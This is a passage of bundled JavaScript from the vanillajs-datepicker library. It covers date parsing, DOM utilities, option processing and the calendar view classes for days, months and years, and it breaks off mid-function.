  function parseDate(dateStr, format, locale) {
    if (dateStr instanceof Date || typeof dateStr === "number") {
      const date = stripTime(dateStr);
      return isNaN(date) ? void 0 : date;
    }
    if (!dateStr) {
      return void 0;
    }
    if (dateStr === "today") {
      return today();
    }
    if (format && format.toValue) {
      const date = format.toValue(dateStr, format, locale);
      return isNaN(date) ? void 0 : stripTime(date);
    }
    return parseFormatString(format).parser(dateStr, locale);
  }
  function formatDate(date, format, locale) {
    if (isNaN(date) || !date && date !== 0) {
      return "";
    }
    const dateObj = typeof date === "number" ? new Date(date) : date;
    if (format.toDisplay) {
      return format.toDisplay(dateObj, format, locale);
    }
    return parseFormatString(format).formatter(dateObj, locale);
  }

  // node_modules/vanillajs-datepicker/js/lib/dom.js
  var range = document.createRange();
  function parseHTML(html) {
    return range.createContextualFragment(html);
  }
  function getParent(el) {
    return el.parentElement || (el.parentNode instanceof ShadowRoot ? el.parentNode.host : void 0);
  }
  function isActiveElement(el) {
    return el.getRootNode().activeElement === el;
  }
  function hideElement(el) {
    if (el.style.display === "none") {
      return;
    }
    if (el.style.display) {
      el.dataset.styleDisplay = el.style.display;
    }
    el.style.display = "none";
  }
  function showElement(el) {
    if (el.style.display !== "none") {
      return;
    }
    if (el.dataset.styleDisplay) {
      el.style.display = el.dataset.styleDisplay;
      delete el.dataset.styleDisplay;
    } else {
      el.style.display = "";
    }
  }
  function emptyChildNodes(el) {
    if (el.firstChild) {
      el.removeChild(el.firstChild);
      emptyChildNodes(el);
    }
  }
  function replaceChildNodes(el, newChildNodes) {
    emptyChildNodes(el);
    if (newChildNodes instanceof DocumentFragment) {
      el.appendChild(newChildNodes);
    } else if (typeof newChildNodes === "string") {
      el.appendChild(parseHTML(newChildNodes));
    } else if (typeof newChildNodes.forEach === "function") {
      newChildNodes.forEach((node) => {
        el.appendChild(node);
      });
    }
  }

  // node_modules/vanillajs-datepicker/js/lib/event.js
  var listenerRegistry = /* @__PURE__ */ new WeakMap();
  var { addEventListener: addEventListener2, removeEventListener: removeEventListener2 } = EventTarget.prototype;
  function registerListeners(keyObj, listeners) {
    let registered = listenerRegistry.get(keyObj);
    if (!registered) {
      registered = [];
      listenerRegistry.set(keyObj, registered);
    }
    listeners.forEach((listener) => {
      addEventListener2.call(...listener);
      registered.push(listener);
    });
  }
  function unregisterListeners(keyObj) {
    let listeners = listenerRegistry.get(keyObj);
    if (!listeners) {
      return;
    }
    listeners.forEach((listener) => {
      removeEventListener2.call(...listener);
    });
    listenerRegistry.delete(keyObj);
  }
  if (!Event.prototype.composedPath) {
    const getComposedPath = (node, path = []) => {
      path.push(node);
      let parent;
      if (node.parentNode) {
        parent = node.parentNode;
      } else if (node.host) {
        parent = node.host;
      } else if (node.defaultView) {
        parent = node.defaultView;
      }
      return parent ? getComposedPath(parent, path) : path;
    };
    Event.prototype.composedPath = function() {
      return getComposedPath(this.target);
    };
  }
  function findFromPath(path, criteria, currentTarget) {
    const [node, ...rest] = path;
    if (criteria(node)) {
      return node;
    }
    if (node === currentTarget || node.tagName === "HTML" || rest.length === 0) {
      return;
    }
    return findFromPath(rest, criteria, currentTarget);
  }
  function findElementInEventPath(ev, selector) {
    const criteria = typeof selector === "function" ? selector : (el) => el instanceof Element && el.matches(selector);
    return findFromPath(ev.composedPath(), criteria, ev.currentTarget);
  }

  // node_modules/vanillajs-datepicker/js/i18n/base-locales.js
  var base_locales_default = {
    en: {
      days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
      daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
      daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
      months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
      monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
      today: "Today",
      clear: "Clear",
      titleFormat: "MM y"
    }
  };

  // node_modules/vanillajs-datepicker/js/options/defaultOptions.js
  var defaultOptions_default = {
    autohide: false,
    beforeShowDay: null,
    beforeShowDecade: null,
    beforeShowMonth: null,
    beforeShowYear: null,
    clearButton: false,
    dateDelimiter: ",",
    datesDisabled: [],
    daysOfWeekDisabled: [],
    daysOfWeekHighlighted: [],
    defaultViewDate: void 0,
    // placeholder, defaults to today() by the program
    disableTouchKeyboard: false,
    enableOnReadonly: true,
    format: "mm/dd/yyyy",
    language: "en",
    maxDate: null,
    maxNumberOfDates: 1,
    maxView: 3,
    minDate: null,
    nextArrow: "\xBB",
    orientation: "auto",
    pickLevel: 0,
    prevArrow: "\xAB",
    showDaysOfWeek: true,
    showOnClick: true,
    showOnFocus: true,
    startView: 0,
    title: "",
    todayButton: false,
    todayButtonMode: 0,
    todayHighlight: false,
    updateOnBlur: true,
    weekNumbers: 0,
    weekStart: 0
  };

  // node_modules/vanillajs-datepicker/js/options/processOptions.js
  var {
    language: defaultLang,
    format: defaultFormat,
    weekStart: defaultWeekStart
  } = defaultOptions_default;
  function sanitizeDOW(dow, day) {
    return dow.length < 6 && day >= 0 && day < 7 ? pushUnique(dow, day) : dow;
  }
  function determineGetWeekMethod(numberingMode, weekStart) {
    const methodId = numberingMode === 4 ? weekStart === 6 ? 3 : !weekStart + 1 : numberingMode;
    switch (methodId) {
      case 1:
        return getIsoWeek;
      case 2:
        return getWesternTradWeek;
      case 3:
        return getMidEasternWeek;
    }
  }
  function updateWeekStart(newValue, config, weekNumbers) {
    config.weekStart = newValue;
    config.weekEnd = (newValue + 6) % 7;
    if (weekNumbers === 4) {
      config.getWeekNumber = determineGetWeekMethod(4, newValue);
    }
    return newValue;
  }
  function validateDate(value, format, locale, origValue) {
    const date = parseDate(value, format, locale);
    return date !== void 0 ? date : origValue;
  }
  function validateViewId(value, origValue, max = 3) {
    const viewId = parseInt(value, 10);
    return viewId >= 0 && viewId <= max ? viewId : origValue;
  }
  function replaceOptions(options, from, to, convert = void 0) {
    if (from in options) {
      if (!(to in options)) {
        options[to] = convert ? convert(options[from]) : options[from];
      }
      delete options[from];
    }
  }
  function processOptions(options, datepicker) {
    const inOpts = Object.assign({}, options);
    const config = {};
    const locales = datepicker.constructor.locales;
    const rangeEnd = !!datepicker.rangeSideIndex;
    let {
      datesDisabled,
      format,
      language,
      locale,
      maxDate,
      maxView,
      minDate,
      pickLevel,
      startView,
      weekNumbers,
      weekStart
    } = datepicker.config || {};
    replaceOptions(inOpts, "calendarWeeks", "weekNumbers", (val) => val ? 1 : 0);
    replaceOptions(inOpts, "clearBtn", "clearButton");
    replaceOptions(inOpts, "todayBtn", "todayButton");
    replaceOptions(inOpts, "todayBtnMode", "todayButtonMode");
    if (inOpts.language) {
      let lang;
      if (inOpts.language !== language) {
        if (locales[inOpts.language]) {
          lang = inOpts.language;
        } else {
          lang = inOpts.language.split("-")[0];
          if (!locales[lang]) {
            lang = false;
          }
        }
      }
      delete inOpts.language;
      if (lang) {
        language = config.language = lang;
        const origLocale = locale || locales[defaultLang];
        locale = Object.assign({
          format: defaultFormat,
          weekStart: defaultWeekStart
        }, locales[defaultLang]);
        if (language !== defaultLang) {
          Object.assign(locale, locales[language]);
        }
        config.locale = locale;
        if (format === origLocale.format) {
          format = config.format = locale.format;
        }
        if (weekStart === origLocale.weekStart) {
          weekStart = updateWeekStart(locale.weekStart, config, weekNumbers);
        }
      }
    }
    if (inOpts.format) {
      const hasToDisplay = typeof inOpts.format.toDisplay === "function";
      const hasToValue = typeof inOpts.format.toValue === "function";
      const validFormatString = reFormatTokens.test(inOpts.format);
      if (hasToDisplay && hasToValue || validFormatString) {
        format = config.format = inOpts.format;
      }
      delete inOpts.format;
    }
    let newPickLevel = pickLevel;
    if ("pickLevel" in inOpts) {
      newPickLevel = validateViewId(inOpts.pickLevel, pickLevel, 2);
      delete inOpts.pickLevel;
    }
    if (newPickLevel !== pickLevel) {
      if (newPickLevel > pickLevel) {
        if (!("minDate" in inOpts)) {
          inOpts.minDate = minDate;
        }
        if (!("maxDate" in inOpts)) {
          inOpts.maxDate = maxDate;
        }
      }
      if (datesDisabled && !inOpts.datesDisabled) {
        inOpts.datesDisabled = [];
      }
      pickLevel = config.pickLevel = newPickLevel;
    }
    let minDt = minDate;
    let maxDt = maxDate;
    if ("minDate" in inOpts) {
      const defaultMinDt = dateValue(0, 0, 1);
      minDt = inOpts.minDate === null ? defaultMinDt : validateDate(inOpts.minDate, format, locale, minDt);
      if (minDt !== defaultMinDt) {
        minDt = regularizeDate(minDt, pickLevel, false);
      }
      delete inOpts.minDate;
    }
    if ("maxDate" in inOpts) {
      maxDt = inOpts.maxDate === null ? void 0 : validateDate(inOpts.maxDate, format, locale, maxDt);
      if (maxDt !== void 0) {
        maxDt = regularizeDate(maxDt, pickLevel, true);
      }
      delete inOpts.maxDate;
    }
    if (maxDt < minDt) {
      minDate = config.minDate = maxDt;
      maxDate = config.maxDate = minDt;
    } else {
      if (minDate !== minDt) {
        minDate = config.minDate = minDt;
      }
      if (maxDate !== maxDt) {
        maxDate = config.maxDate = maxDt;
      }
    }
    if (inOpts.datesDisabled) {
      const dtsDisabled = inOpts.datesDisabled;
      if (typeof dtsDisabled === "function") {
        config.datesDisabled = null;
        config.checkDisabled = (timeValue, viewId) => dtsDisabled(
          new Date(timeValue),
          viewId,
          rangeEnd
        );
      } else {
        const disabled = config.datesDisabled = dtsDisabled.reduce((dates, dt) => {
          const date = parseDate(dt, format, locale);
          return date !== void 0 ? pushUnique(dates, regularizeDate(date, pickLevel, rangeEnd)) : dates;
        }, []);
        config.checkDisabled = (timeValue) => disabled.includes(timeValue);
      }
      delete inOpts.datesDisabled;
    }
    if ("defaultViewDate" in inOpts) {
      const viewDate = parseDate(inOpts.defaultViewDate, format, locale);
      if (viewDate !== void 0) {
        config.defaultViewDate = viewDate;
      }
      delete inOpts.defaultViewDate;
    }
    if ("weekStart" in inOpts) {
      const wkStart = Number(inOpts.weekStart) % 7;
      if (!isNaN(wkStart)) {
        weekStart = updateWeekStart(wkStart, config, weekNumbers);
      }
      delete inOpts.weekStart;
    }
    if (inOpts.daysOfWeekDisabled) {
      config.daysOfWeekDisabled = inOpts.daysOfWeekDisabled.reduce(sanitizeDOW, []);
      delete inOpts.daysOfWeekDisabled;
    }
    if (inOpts.daysOfWeekHighlighted) {
      config.daysOfWeekHighlighted = inOpts.daysOfWeekHighlighted.reduce(sanitizeDOW, []);
      delete inOpts.daysOfWeekHighlighted;
    }
    if ("weekNumbers" in inOpts) {
      let method = inOpts.weekNumbers;
      if (method) {
        const getWeekNumber = typeof method === "function" ? (timeValue, startOfWeek) => method(new Date(timeValue), startOfWeek) : determineGetWeekMethod(method = parseInt(method, 10), weekStart);
        if (getWeekNumber) {
          weekNumbers = config.weekNumbers = method;
          config.getWeekNumber = getWeekNumber;
        }
      } else {
        weekNumbers = config.weekNumbers = 0;
        config.getWeekNumber = null;
      }
      delete inOpts.weekNumbers;
    }
    if ("maxNumberOfDates" in inOpts) {
      const maxNumberOfDates = parseInt(inOpts.maxNumberOfDates, 10);
      if (maxNumberOfDates >= 0) {
        config.maxNumberOfDates = maxNumberOfDates;
        config.multidate = maxNumberOfDates !== 1;
      }
      delete inOpts.maxNumberOfDates;
    }
    if (inOpts.dateDelimiter) {
      config.dateDelimiter = String(inOpts.dateDelimiter);
      delete inOpts.dateDelimiter;
    }
    let newMaxView = maxView;
    if ("maxView" in inOpts) {
      newMaxView = validateViewId(inOpts.maxView, maxView);
      delete inOpts.maxView;
    }
    newMaxView = pickLevel > newMaxView ? pickLevel : newMaxView;
    if (newMaxView !== maxView) {
      maxView = config.maxView = newMaxView;
    }
    let newStartView = startView;
    if ("startView" in inOpts) {
      newStartView = validateViewId(inOpts.startView, newStartView);
      delete inOpts.startView;
    }
    if (newStartView < pickLevel) {
      newStartView = pickLevel;
    } else if (newStartView > maxView) {
      newStartView = maxView;
    }
    if (newStartView !== startView) {
      config.startView = newStartView;
    }
    if (inOpts.prevArrow) {
      const prevArrow = parseHTML(inOpts.prevArrow);
      if (prevArrow.childNodes.length > 0) {
        config.prevArrow = prevArrow.childNodes;
      }
      delete inOpts.prevArrow;
    }
    if (inOpts.nextArrow) {
      const nextArrow = parseHTML(inOpts.nextArrow);
      if (nextArrow.childNodes.length > 0) {
        config.nextArrow = nextArrow.childNodes;
      }
      delete inOpts.nextArrow;
    }
    if ("disableTouchKeyboard" in inOpts) {
      config.disableTouchKeyboard = "ontouchstart" in document && !!inOpts.disableTouchKeyboard;
      delete inOpts.disableTouchKeyboard;
    }
    if (inOpts.orientation) {
      const orientation = inOpts.orientation.toLowerCase().split(/\s+/g);
      config.orientation = {
        x: orientation.find((x) => x === "left" || x === "right") || "auto",
        y: orientation.find((y) => y === "top" || y === "bottom") || "auto"
      };
      delete inOpts.orientation;
    }
    if ("todayButtonMode" in inOpts) {
      switch (inOpts.todayButtonMode) {
        case 0:
        case 1:
          config.todayButtonMode = inOpts.todayButtonMode;
      }
      delete inOpts.todayButtonMode;
    }
    Object.entries(inOpts).forEach(([key, value]) => {
      if (value !== void 0 && key in defaultOptions_default) {
        config[key] = value;
      }
    });
    return config;
  }

  // node_modules/vanillajs-datepicker/js/options/shortcutKeys.js
  var defaultShortcutKeys = {
    show: { key: "ArrowDown" },
    hide: null,
    toggle: { key: "Escape" },
    prevButton: { key: "ArrowLeft", ctrlOrMetaKey: true },
    nextButton: { key: "ArrowRight", ctrlOrMetaKey: true },
    viewSwitch: { key: "ArrowUp", ctrlOrMetaKey: true },
    clearButton: { key: "Backspace", ctrlOrMetaKey: true },
    todayButton: { key: ".", ctrlOrMetaKey: true },
    exitEditMode: { key: "ArrowDown", ctrlOrMetaKey: true }
  };
  function createShortcutKeyConfig(options) {
    return Object.keys(defaultShortcutKeys).reduce((keyDefs, shortcut) => {
      const keyDef = options[shortcut] === void 0 ? defaultShortcutKeys[shortcut] : options[shortcut];
      const key = keyDef && keyDef.key;
      if (!key || typeof key !== "string") {
        return keyDefs;
      }
      const normalizedDef = {
        key,
        ctrlOrMetaKey: !!(keyDef.ctrlOrMetaKey || keyDef.ctrlKey || keyDef.metaKey)
      };
      if (key.length > 1) {
        normalizedDef.altKey = !!keyDef.altKey;
        normalizedDef.shiftKey = !!keyDef.shiftKey;
      }
      keyDefs[shortcut] = normalizedDef;
      return keyDefs;
    }, {});
  }

  // node_modules/vanillajs-datepicker/js/picker/templates/pickerTemplate.js
  var getButtons = (buttonList) => buttonList.map((classes) => `<button type="button" class="%buttonClass% ${classes}" tabindex="-1"></button>`).join("");
  var pickerTemplate_default = optimizeTemplateHTML(`<div class="datepicker">
  <div class="datepicker-picker">
    <div class="datepicker-header">
      <div class="datepicker-title"></div>
      <div class="datepicker-controls">
        ${getButtons([
    "prev-button prev-btn",
    "view-switch",
    "next-button next-btn"
  ])}
      </div>
    </div>
    <div class="datepicker-main"></div>
    <div class="datepicker-footer">
      <div class="datepicker-controls">
        ${getButtons([
    "today-button today-btn",
    "clear-button clear-btn"
  ])}
      </div>
    </div>
  </div>
</div>`);

  // node_modules/vanillajs-datepicker/js/picker/templates/daysTemplate.js
  var daysTemplate_default = optimizeTemplateHTML(`<div class="days">
  <div class="days-of-week">${createTagRepeat("span", 7, { class: "dow" })}</div>
  <div class="datepicker-grid">${createTagRepeat("span", 42)}</div>
</div>`);

  // node_modules/vanillajs-datepicker/js/picker/templates/weekNumbersTemplate.js
  var weekNumbersTemplate_default = optimizeTemplateHTML(`<div class="week-numbers calendar-weeks">
  <div class="days-of-week"><span class="dow"></span></div>
  <div class="weeks">${createTagRepeat("span", 6, { class: "week" })}</div>
</div>`);

  // node_modules/vanillajs-datepicker/js/picker/views/View.js
  var View2 = class {
    constructor(picker, config) {
      Object.assign(this, config, {
        picker,
        element: parseHTML(`<div class="datepicker-view"></div>`).firstChild,
        selected: [],
        isRangeEnd: !!picker.datepicker.rangeSideIndex
      });
      this.init(this.picker.datepicker.config);
    }
    init(options) {
      if ("pickLevel" in options) {
        this.isMinView = this.id === options.pickLevel;
      }
      this.setOptions(options);
      this.updateFocus();
      this.updateSelection();
    }
    prepareForRender(switchLabel, prevButtonDisabled, nextButtonDisabled) {
      this.disabled = [];
      const picker = this.picker;
      picker.setViewSwitchLabel(switchLabel);
      picker.setPrevButtonDisabled(prevButtonDisabled);
      picker.setNextButtonDisabled(nextButtonDisabled);
    }
    setDisabled(date, classList) {
      classList.add("disabled");
      pushUnique(this.disabled, date);
    }
    // Execute beforeShow() callback and apply the result to the element
    // args:
    performBeforeHook(el, timeValue) {
      let result = this.beforeShow(new Date(timeValue));
      switch (typeof result) {
        case "boolean":
          result = { enabled: result };
          break;
        case "string":
          result = { classes: result };
      }
      if (result) {
        const classList = el.classList;
        if (result.enabled === false) {
          this.setDisabled(timeValue, classList);
        }
        if (result.classes) {
          const extraClasses = result.classes.split(/\s+/);
          classList.add(...extraClasses);
          if (extraClasses.includes("disabled")) {
            this.setDisabled(timeValue, classList);
          }
        }
        if (result.content) {
          replaceChildNodes(el, result.content);
        }
      }
    }
    renderCell(el, content, cellVal, date, { selected, range: range2 }, outOfScope, extraClasses = []) {
      el.textContent = content;
      if (this.isMinView) {
        el.dataset.date = date;
      }
      const classList = el.classList;
      el.className = `datepicker-cell ${this.cellClass}`;
      if (cellVal < this.first) {
        classList.add("prev");
      } else if (cellVal > this.last) {
        classList.add("next");
      }
      classList.add(...extraClasses);
      if (outOfScope || this.checkDisabled(date, this.id)) {
        this.setDisabled(date, classList);
      }
      if (range2) {
        const [rangeStart, rangeEnd] = range2;
        if (cellVal > rangeStart && cellVal < rangeEnd) {
          classList.add("range");
        }
        if (cellVal === rangeStart) {
          classList.add("range-start");
        }
        if (cellVal === rangeEnd) {
          classList.add("range-end");
        }
      }
      if (selected.includes(cellVal)) {
        classList.add("selected");
      }
      if (cellVal === this.focused) {
        classList.add("focused");
      }
      if (this.beforeShow) {
        this.performBeforeHook(el, date);
      }
    }
    refreshCell(el, cellVal, selected, [rangeStart, rangeEnd]) {
      const classList = el.classList;
      classList.remove("range", "range-start", "range-end", "selected", "focused");
      if (cellVal > rangeStart && cellVal < rangeEnd) {
        classList.add("range");
      }
      if (cellVal === rangeStart) {
        classList.add("range-start");
      }
      if (cellVal === rangeEnd) {
        classList.add("range-end");
      }
      if (selected.includes(cellVal)) {
        classList.add("selected");
      }
      if (cellVal === this.focused) {
        classList.add("focused");
      }
    }
    changeFocusedCell(cellIndex) {
      this.grid.querySelectorAll(".focused").forEach((el) => {
        el.classList.remove("focused");
      });
      this.grid.children[cellIndex].classList.add("focused");
    }
  };

  // node_modules/vanillajs-datepicker/js/picker/views/DaysView.js
  var DaysView = class extends View2 {
    constructor(picker) {
      super(picker, {
        id: 0,
        name: "days",
        cellClass: "day"
      });
    }
    init(options, onConstruction = true) {
      if (onConstruction) {
        const inner = parseHTML(daysTemplate_default).firstChild;
        this.dow = inner.firstChild;
        this.grid = inner.lastChild;
        this.element.appendChild(inner);
      }
      super.init(options);
    }
    setOptions(options) {
      let updateDOW;
      if ("minDate" in options) {
        this.minDate = options.minDate;
      }
      if ("maxDate" in options) {
        this.maxDate = options.maxDate;
      }
      if (options.checkDisabled) {
        this.checkDisabled = options.checkDisabled;
      }
      if (options.daysOfWeekDisabled) {
        this.daysOfWeekDisabled = options.daysOfWeekDisabled;
        updateDOW = true;
      }
      if (options.daysOfWeekHighlighted) {
        this.daysOfWeekHighlighted = options.daysOfWeekHighlighted;
      }
      if ("todayHighlight" in options) {
        this.todayHighlight = options.todayHighlight;
      }
      if ("weekStart" in options) {
        this.weekStart = options.weekStart;
        this.weekEnd = options.weekEnd;
        updateDOW = true;
      }
      if (options.locale) {
        const locale = this.locale = options.locale;
        this.dayNames = locale.daysMin;
        this.switchLabelFormat = locale.titleFormat;
        updateDOW = true;
      }
      if ("beforeShowDay" in options) {
        this.beforeShow = typeof options.beforeShowDay === "function" ? options.beforeShowDay : void 0;
      }
      if ("weekNumbers" in options) {
        if (options.weekNumbers && !this.weekNumbers) {
          const weeksElem = parseHTML(weekNumbersTemplate_default).firstChild;
          this.weekNumbers = {
            element: weeksElem,
            dow: weeksElem.firstChild,
            weeks: weeksElem.lastChild
          };
          this.element.insertBefore(weeksElem, this.element.firstChild);
        } else if (this.weekNumbers && !options.weekNumbers) {
          this.element.removeChild(this.weekNumbers.element);
          this.weekNumbers = null;
        }
      }
      if ("getWeekNumber" in options) {
        this.getWeekNumber = options.getWeekNumber;
      }
      if ("showDaysOfWeek" in options) {
        if (options.showDaysOfWeek) {
          showElement(this.dow);
          if (this.weekNumbers) {
            showElement(this.weekNumbers.dow);
          }
        } else {
          hideElement(this.dow);
          if (this.weekNumbers) {
            hideElement(this.weekNumbers.dow);
          }
        }
      }
      if (updateDOW) {
        Array.from(this.dow.children).forEach((el, index) => {
          const dow = (this.weekStart + index) % 7;
          el.textContent = this.dayNames[dow];
          el.className = this.daysOfWeekDisabled.includes(dow) ? "dow disabled" : "dow";
        });
      }
    }
    // Apply update on the focused date to view's settings
    updateFocus() {
      const viewDate = new Date(this.picker.viewDate);
      const viewYear = viewDate.getFullYear();
      const viewMonth = viewDate.getMonth();
      const firstOfMonth = dateValue(viewYear, viewMonth, 1);
      const start2 = dayOfTheWeekOf(firstOfMonth, this.weekStart, this.weekStart);
      this.first = firstOfMonth;
      this.last = dateValue(viewYear, viewMonth + 1, 0);
      this.start = start2;
      this.focused = this.picker.viewDate;
    }
    // Apply update on the selected dates to view's settings
    updateSelection() {
      const { dates, rangepicker } = this.picker.datepicker;
      this.selected = dates;
      if (rangepicker) {
        this.range = rangepicker.dates;
      }
    }
    // Update the entire view UI
    render() {
      this.today = this.todayHighlight ? today() : void 0;
      this.prepareForRender(
        formatDate(this.focused, this.switchLabelFormat, this.locale),
        this.first <= this.minDate,
        this.last >= this.maxDate
      );
      if (this.weekNumbers) {
        const weekStart = this.weekStart;
        const startOfWeek = dayOfTheWeekOf(this.first, weekStart, weekStart);
        Array.from(this.weekNumbers.weeks.children).forEach((el, index) => {
          const dateOfWeekStart = addWeeks(startOfWeek, index);
          el.textContent = this.getWeekNumber(dateOfWeekStart, weekStart);
          if (index > 3) {
            el.classList[dateOfWeekStart > this.last ? "add" : "remove"]("next");
          }
        });
      }
      Array.from(this.grid.children).forEach((el, index) => {
        const current = addDays(this.start, index);
        const dateObj = new Date(current);
        const day = dateObj.getDay();
        const extraClasses = [];
        if (this.today === current) {
          extraClasses.push("today");
        }
        if (this.daysOfWeekHighlighted.includes(day)) {
          extraClasses.push("highlighted");
        }
        this.renderCell(
          el,
          dateObj.getDate(),
          current,
          current,
          this,
          current < this.minDate || current > this.maxDate || this.daysOfWeekDisabled.includes(day),
          extraClasses
        );
      });
    }
    // Update the view UI by applying the changes of selected and focused items
    refresh() {
      const range2 = this.range || [];
      Array.from(this.grid.children).forEach((el) => {
        this.refreshCell(el, Number(el.dataset.date), this.selected, range2);
      });
    }
    // Update the view UI by applying the change of focused item
    refreshFocus() {
      this.changeFocusedCell(Math.round((this.focused - this.start) / 864e5));
    }
  };

  // node_modules/vanillajs-datepicker/js/picker/views/MonthsView.js
  function computeMonthRange(range2, thisYear) {
    if (!range2 || !range2[0] || !range2[1]) {
      return;
    }
    const [[startY, startM], [endY, endM]] = range2;
    if (startY > thisYear || endY < thisYear) {
      return;
    }
    return [
      startY === thisYear ? startM : -1,
      endY === thisYear ? endM : 12
    ];
  }
  var MonthsView = class extends View2 {
    constructor(picker) {
      super(picker, {
        id: 1,
        name: "months",
        cellClass: "month"
      });
    }
    init(options, onConstruction = true) {
      if (onConstruction) {
        this.grid = this.element;
        this.element.classList.add("months", "datepicker-grid");
        this.grid.appendChild(parseHTML(createTagRepeat("span", 12, { "data-month": (ix) => ix })));
        this.first = 0;
        this.last = 11;
      }
      super.init(options);
    }
    setOptions(options) {
      if (options.locale) {
        this.monthNames = options.locale.monthsShort;
      }
      if ("minDate" in options) {
        if (options.minDate === void 0) {
          this.minYear = this.minMonth = this.minDate = void 0;
        } else {
          const minDateObj = new Date(options.minDate);
          this.minYear = minDateObj.getFullYear();
          this.minMonth = minDateObj.getMonth();
          this.minDate = minDateObj.setDate(1);
        }
      }
      if ("maxDate" in options) {
        if (options.maxDate === void 0) {
          this.maxYear = this.maxMonth = this.maxDate = void 0;
        } else {
          const maxDateObj = new Date(options.maxDate);
          this.maxYear = maxDateObj.getFullYear();
          this.maxMonth = maxDateObj.getMonth();
          this.maxDate = dateValue(this.maxYear, this.maxMonth + 1, 0);
        }
      }
      if (options.checkDisabled) {
        this.checkDisabled = this.isMinView || options.datesDisabled === null ? options.checkDisabled : () => false;
      }
      if ("beforeShowMonth" in options) {
        this.beforeShow = typeof options.beforeShowMonth === "function" ? options.beforeShowMonth : void 0;
      }
    }
    // Update view's settings to reflect the viewDate set on the picker
    updateFocus() {
      const viewDate = new Date(this.picker.viewDate);
      this.year = viewDate.getFullYear();
      this.focused = viewDate.getMonth();
    }
    // Update view's settings to reflect the selected dates
    updateSelection() {
      const { dates, rangepicker } = this.picker.datepicker;
      this.selected = dates.reduce((selected, timeValue) => {
        const date = new Date(timeValue);
        const year = date.getFullYear();
        const month = date.getMonth();
        if (selected[year] === void 0) {
          selected[year] = [month];
        } else {
          pushUnique(selected[year], month);
        }
        return selected;
      }, {});
      if (rangepicker && rangepicker.dates) {
        this.range = rangepicker.dates.map((timeValue) => {
          const date = new Date(timeValue);
          return isNaN(date) ? void 0 : [date.getFullYear(), date.getMonth()];
        });
      }
    }
    // Update the entire view UI
    render() {
      this.prepareForRender(
        this.year,
        this.year <= this.minYear,
        this.year >= this.maxYear
      );
      const selected = this.selected[this.year] || [];
      const yrOutOfRange = this.year < this.minYear || this.year > this.maxYear;
      const isMinYear = this.year === this.minYear;
      const isMaxYear = this.year === this.maxYear;
      const range2 = computeMonthRange(this.range, this.year);
      Array.from(this.grid.children).forEach((el, index) => {
        const date = regularizeDate(new Date(this.year, index, 1), 1, this.isRangeEnd);
        this.renderCell(
          el,
          this.monthNames[index],
          index,
          date,
          { selected, range: range2 },
          yrOutOfRange || isMinYear && index < this.minMonth || isMaxYear && index > this.maxMonth
        );
      });
    }
    // Update the view UI by applying the changes of selected and focused items
    refresh() {
      const selected = this.selected[this.year] || [];
      const range2 = computeMonthRange(this.range, this.year) || [];
      Array.from(this.grid.children).forEach((el, index) => {
        this.refreshCell(el, index, selected, range2);
      });
    }
    // Update the view UI by applying the change of focused item
    refreshFocus() {
      this.changeFocusedCell(this.focused);
    }
  };

  // node_modules/vanillajs-datepicker/js/picker/views/YearsView.js
  function toTitleCase(word) {
    return [...word].reduce((str, ch, ix) => str += ix ? ch : ch.toUpperCase(), "");
  }
  var YearsView = class extends View2 {
    constructor(picker, config) {
      super(picker, config);
    }
    init(options, onConstruction = true) {
      if (onConstruction) {
        this.navStep = this.step * 10;
        this.beforeShowOption = `beforeShow${toTitleCase(this.cellClass)}`;
        this.grid = this.element;
        this.element.classList.add(this.name, "datepicker-grid");
        this.grid.appendChild(parseHTML(createTagRepeat("span", 12)));
      }
      super.init(options);
    }
    setOptions(options) {
      if ("minDate" in options) {
        if (options.minDate === void 0) {
          this.minYear = this.minDate = void 0;
        } else {
          this.minYear = startOfYearPeriod(options.minDate, this.step);
          this.minDate = dateValue(this.minYear, 0, 1);
        }
      }
      if ("maxDate" in options) {
        if (options.maxDate === void 0) {
          this.maxYear = this.maxDate = void 0;
        } else {
          this.maxYear = startOfYearPeriod(options.maxDate, this.step);
          this.maxDate = dateValue(this.maxYear, 11, 31);
        }
      }
      if (options.checkDisabled) {
        this.checkDisabled = this.isMinView || options.datesDisabled === null ? options.checkDisabled : () => false;
      }
      if (this.beforeShowOption in options) {
        const beforeShow = options[this.beforeShowOption];
        this.beforeShow = typeof beforeShow === "function" ? beforeShow : void 0;
      }
    }
    // Update view's settings to reflect the viewDate set on the picker
    updateFocus() {
      const viewDate = new Date(this.picker.viewDate);
      const first = startOfYearPeriod(viewDate, this.navStep);
      const last = first + 9 * this.step;
      this.first = first;
      this.last = last;
      this.start = first - this.step;
      this.focused = startOfYearPeriod(viewDate, this.step);
    }
    // Update view's settings to reflect the selected dates
    updateSelection() {
      const { dates, rangepicker } = this.picker.datepicker;
      this.selected = dates.reduce((years, timeValue) => {
        return pushUnique(years, startOfYearPeriod(timeValue, this.step));
      }, []);
      if (rangepicker && rangepicker.dates) {
        this.range = rangepicker.dates.map((timeValue) => {
          if (timeValue !== void 0) {
            return startOfYearPeriod(timeValue, this.step);
          }
        });
      }
    }
    // Update the entire view UI
    render() {
      this.prepareForRender(
        `${this.first}-${this.last}`,
        this.first <= this.minYear,
        this.last >= this.maxYear
      );
      Array.from(this.grid.children).forEach((el, index) => {
        const current = this.start + index * this.step;
        const date = regularizeDate(new Date(current, 0, 1), 2, this.isRangeEnd);
        el.dataset.year = current;
        this.renderCell(
          el,
          current,
          current,
          date,
          this,
          current < this.minYear || current > this.maxYear
        );
      });
    }
    // Update the view UI by applying the changes of selected and focused items
    refresh() {
      const range2 = this.range || [];
      Array.from(this.grid.children).forEach((el) => {
        this.refreshCell(el, Number(el.textContent), this.selected, range2);
      });
    }
    // Update the view UI by applying the change of focused item
    refreshFocus() {
      this.changeFocusedCell(Math.round((this.focused - this.start) / this.step));
    }
  };

  // node_modules/vanillajs-datepicker/js/events/functions.js
  function triggerDatepickerEvent(datepicker, type) {
    const options = {
      bubbles: true,
      cancelable: true,
      detail: {
        date: datepicker.getDate(),
        viewDate: new Date(datepicker.picker.viewDate),
        viewId: datepicker.picker.currentView.id,
        datepicker
      }
    };
    datepicker.element.dispatchEvent(new CustomEvent(type, options));
  }
  function goToPrevOrNext(datepicker, direction) {
    const { config, picker } = datepicker;
